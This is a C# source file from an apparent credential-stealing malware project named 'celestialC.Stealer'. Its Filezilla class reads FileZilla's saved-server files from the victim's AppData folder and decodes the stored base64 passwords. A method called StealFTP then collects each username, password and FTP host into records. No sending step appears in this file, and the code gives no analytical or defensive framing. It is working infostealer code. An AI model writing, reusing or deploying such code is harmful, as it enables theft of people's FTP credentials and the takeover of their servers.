using celestialC.Stealer.Browsers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace celestialC.Stealer.FTP
{
    internal static class Filezilla
    {
        private static string[] GetPswPath()
        {
            string fz = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\";
            return new string[] { fz + "recentservers.xml", fz + "sitemanager.xml" };
        }

        internal static async Task<PasswordFormat[]> StealFTP()
        {
            string[] files = GetPswPath();
            var servers = new List<PasswordFormat>();

            if (!File.Exists(files[0]) && !File.Exists(files[1]))
                return servers.ToArray();
            foreach (string pwFile in files)
            {
                try
                {
                    if (!File.Exists(pwFile))
                        continue;
                    XmlDocument xDOC = new XmlDocument();
                    xDOC.Load(pwFile);

                    foreach (XmlNode xNode in xDOC.GetElementsByTagName("Server"))
                    {
                        servers.Add(new PasswordFormat(xNode["User"].InnerText,
                            Encoding.UTF8.GetString(Convert.FromBase64String(xNode["Pass"].InnerText)), "ftp://" + xNode["Host"].InnerText + ":" + xNode["Port"].InnerText + "/"));

                        //
                    }
                }
                catch { }
            }
            return servers.ToArray();
        }
    }
}
